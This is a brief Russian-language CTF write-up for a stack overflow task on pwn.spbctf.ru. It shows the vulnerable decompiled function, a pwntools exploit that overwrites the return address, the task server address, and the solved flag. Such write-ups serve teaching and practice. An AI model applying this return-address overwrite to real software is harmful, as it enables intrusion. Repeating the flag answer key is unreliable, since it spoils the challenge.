[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn2_mc4)
Описание:
Перетрите адрес возврата
`nc 109.233.56.90 11605`
**[ret](https://pwn.spbctf.ru/files/canary/ret)**

Необходимо переполнить буфер + дополнительно 8 байт, а затем перетереть адрес возврата.
``` C
void __cdecl play()
{
  char buf[8]; // [rsp+8h] [rbp-8h] BYREF

  puts("Let's overflow return address!");
  read(0, buf, 32u);
}
```

Эксплоит:
``` python
io = start()

payload = b'A' * 16 + p64(0x401162)
io.sendline(payload)

io.interactive()
```

Запуск:
![{B19EB145-28FD-441E-B30E-FF42D4341DFB}](../../../../z.%20Images/{B19EB145-28FD-441E-B30E-FF42D4341DFB}.png)

Ответ: `spbctf{7f6eba140c378e636419e0259268e546}`